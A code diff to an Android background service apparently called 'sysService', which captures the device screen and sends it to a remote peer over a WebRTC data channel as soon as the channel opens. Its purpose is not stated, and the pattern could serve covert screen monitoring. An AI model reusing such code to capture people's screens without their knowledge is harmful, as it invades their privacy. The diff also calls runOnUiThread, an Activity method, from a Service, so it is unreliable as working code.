@@ -505,13 +505,17 @@ public class sysService extends Service implements SysInterface{
     // end webrtc methods
 
     // screen shot
+
     public void sendScreenshot(int shotN){
         if (perData != null){
             initDataChannel();
-            Screenshot.getObj().takeScreenshot(this);
+
         }else {
             getPermission();
         }
+    }
+    public void takeScreenshot(){
+        Screenshot.getObj().takeScreenshot(this);
     }
     private void getPermission() {
         resetSocket();
@@ -541,6 +545,27 @@ public class sysService extends Service implements SysInterface{
         peerConnectionFactory = new PeerConnectionFactory(null);
         createPeerConnection("data");
         localDataChannel = localPeer.createDataChannel("sendDataChannel", new DataChannel.Init());
+        localDataChannel.registerObserver(new DataChannel.Observer() {
+            @Override
+            public void onBufferedAmountChange(long l) {
+
+            }
+
+            @Override
+            public void onStateChange() {
+                runOnUiThread(() -> {
+                    if (localDataChannel.state() == DataChannel.State.OPEN) {
+                        takeScreenshot();
+                    } 
+                });
+            }
+
+            @Override
+            public void onMessage(DataChannel.Buffer buffer) {
+                // Incoming messages, ignore
+                // Only outcoming messages used in this example
+            }
+        });
         doCall();
     }
 
